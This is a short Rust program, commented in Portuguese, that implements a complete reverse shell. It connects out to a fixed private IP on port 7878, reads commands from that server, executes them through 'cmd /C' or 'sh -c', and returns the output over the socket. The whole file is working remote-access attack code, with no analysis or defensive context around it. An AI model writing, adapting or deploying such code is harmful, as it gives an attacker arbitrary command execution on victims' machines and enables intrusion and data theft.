use std::io::{Read, Write}; // Importa módulos para leitura e escrita
use std::net::TcpStream;    // Importa o módulo para criar a conexão TCP
use std::process::{Command, Stdio}; // Importa módulos para executar comandos

fn main() {
    // Tenta conectar ao servidor na porta 7878
    let mut stream = TcpStream::connect("192.168.1.100:7878").expect("Não foi possível conectar ao servidor");

    loop {
        let mut buffer = [0; 1024]; // Buffer para armazenar os dados lidos do socket
        // Lê os dados do socket
        let bytes_read = stream.read(&mut buffer).expect("Falha ao ler do socket");

        // Se não houver mais dados, quebra o loop
        if bytes_read == 0 {
            break;
        }

        // Converte os bytes lidos para uma string
        let command = String::from_utf8_lossy(&buffer[..bytes_read]);

        // Executa o comando recebido
        let output = if cfg!(target_os = "windows") {
            Command::new("cmd")
                .args(&["/C", &command])
                .output()
                .expect("Falha ao executar o comando")
        } else {
            Command::new("sh")
                .arg("-c")
                .arg(&command)
                .output()
                .expect("Falha ao executar o comando")
        };

        // Envia a saída do comando de volta para o servidor
        stream.write(&output.stdout).expect("Falha ao escrever no socket");
        stream.write(&output.stderr).expect("Falha ao escrever no socket");
    }
}
